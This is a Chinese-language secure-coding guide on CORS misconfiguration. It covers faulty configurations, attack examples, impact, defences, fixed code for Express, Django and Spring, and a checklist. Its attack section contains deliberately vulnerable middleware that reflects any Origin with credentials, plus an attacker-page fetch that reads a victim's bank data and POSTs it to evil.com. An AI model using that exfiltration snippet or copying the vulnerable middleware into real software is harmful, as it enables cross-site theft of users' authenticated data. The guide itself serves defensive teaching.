# CORS 配置错误 (CORS Misconfiguration)

> 分类：浏览器安全策略 | 风险：高 | CWE-942

## 1. 攻击原理

同源策略默认阻止跨站读取响应。CORS 通过响应头显式放行。配置不当会让**任意站点读取用户已认证的响应**，等价于绕过同源策略：

| 错误配置 | 后果 |
|---|---|
| `Access-Control-Allow-Origin: *` + `Allow-Credentials: true` | 浏览器实际会拒绝，但许多实现回显 Origin，等价于任意源放行 |
| 动态回显任意 `Origin` | 任意站点可带凭证读取 |
| 正则匹配不严（`site.com.evil.com`、`evilsite.com`） | 子串匹配被绕过 |
| 允许 `null` Origin | sandbox iframe / `file://` / 重定向可伪造 |
| 允许所有方法/头 + 凭证 | 扩大攻击面 |
| 子域信任 + 子域可被接管 | 接管子域即获得信任 |

## 2. 攻击示例

服务端错误实现：

```js
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);  // ❌ 回显任意源
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
```

攻击者站点：

```js
fetch('https://api.bank.com/me', { credentials: 'include' })
  .then(r => r.json())
  .then(d => fetch('https://evil.com/collect', { method: 'POST', body: JSON.stringify(d) }));
```

用户访问攻击页面，即可读取其银行资料。

正则绕过：

```js
const re = /bank\.com/;            // ❌ 子串匹配
// Origin: https://bank.com.evil.com  → 通过
```

`null` Origin：sandbox iframe 或 `data:` 页面发起请求，Origin 为 `null`，若被允许即可被利用。

## 3. 影响

- 跨站读取敏感数据（个人信息、Token、余额）
- 配合 CSRF 执行写操作
- 内网/管理 API 被外部页面访问

## 4. 防御措施

1. **精确白名单**：完整 origin 字符串比对（含协议与端口），不用子串/正则模糊匹配。
2. **默认拒绝**：不在白名单内则不返回任何 CORS 头（浏览器自然拦截）。
3. **`*` 与 credentials 互斥**：公开只读 API 可用 `*`，但绝不能同时 `Allow-Credentials: true`。
4. **拒绝 `null` Origin**：显式排除。
5. **限制方法与头**：`Access-Control-Allow-Methods` 只列必要方法；`Allow-Headers` 精确列出。
6. **`Vary: Origin`**：使用 CDN/缓存时必须加，防止缓存串源。
7. **预检缓存合理**：`Access-Control-Max-Age` 不要过长（如 ≤ 600s）。
8. **不要用 CORS 做访问控制**：真正的鉴权在服务端；CORS 只影响浏览器读取。
9. **子域治理**：若信任子域，确保子域不可被第三方接管（防子域劫持）。

## 5. 代码对比

```js
// ❌ 回显任意源
res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
res.setHeader('Access-Control-Allow-Credentials', 'true');

// ✅ 精确白名单
const ALLOWED = new Set([
  'https://app.site.com',
  'https://admin.site.com',
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PATCH,DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-CSRF-Token');
    res.setHeader('Vary', 'Origin');
    if (req.method === 'OPTIONS') {
      res.setHeader('Access-Control-Max-Age', '600');
      return res.sendStatus(204);
    }
  }
  next();
});
```

```python
# ✅ Django-cors-headers
CORS_ALLOWED_ORIGINS = ["https://app.site.com"]
CORS_ALLOW_CREDENTIALS = True
CORS_ALLOWED_ORIGIN_REGEXES = []   # 避免模糊正则
```

```java
// ✅ Spring
@CrossOrigin(origins = "https://app.site.com", allowCredentials = "true",
             methods = {RequestMethod.GET, RequestMethod.POST})
```

## 6. 自查清单

- [ ] 白名单为完整 origin，非子串/正则模糊匹配
- [ ] 不在白名单时不返回 CORS 头
- [ ] `*` 未与 `Allow-Credentials: true` 同时使用
- [ ] 显式拒绝 `null` Origin
- [ ] 方法与头精确限制
- [ ] 使用缓存时带 `Vary: Origin`
- [ ] 预检缓存时间合理
- [ ] 不把 CORS 当访问控制，服务端鉴权完整

## 7. 参考资料

- OWASP: CORS OriginHeaderScrutiny / HTML5 Security Cheat Sheet
- CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- PortSwigger: CORS
- MDN: CORS
